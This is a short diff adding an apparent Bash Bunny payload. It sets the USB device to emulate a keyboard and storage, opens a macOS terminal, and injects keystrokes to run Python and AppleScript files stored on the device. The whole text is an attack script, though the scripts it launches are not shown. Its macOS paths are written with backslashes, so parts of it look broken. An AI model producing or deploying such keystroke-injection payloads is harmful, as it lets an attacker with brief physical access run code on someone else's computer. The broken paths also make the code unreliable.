@@ -1,0 +1,7 @@
+GET SWITCH_POSITION
+LED ATTACK
+ATTACKMODE HID STORAGE
+RUN OSX terminal
+QUACK python \Volumes\BashBunny\payloads\\$SWITCH_POSITION\a.py
+QUACK osascript \Volumes\BashBunny\payloads\\$SWITCH_POSITION\b.scpt
+QUACK python \Volumes\BashBunny\payloads\\$SWITCH_POSITION\a.py
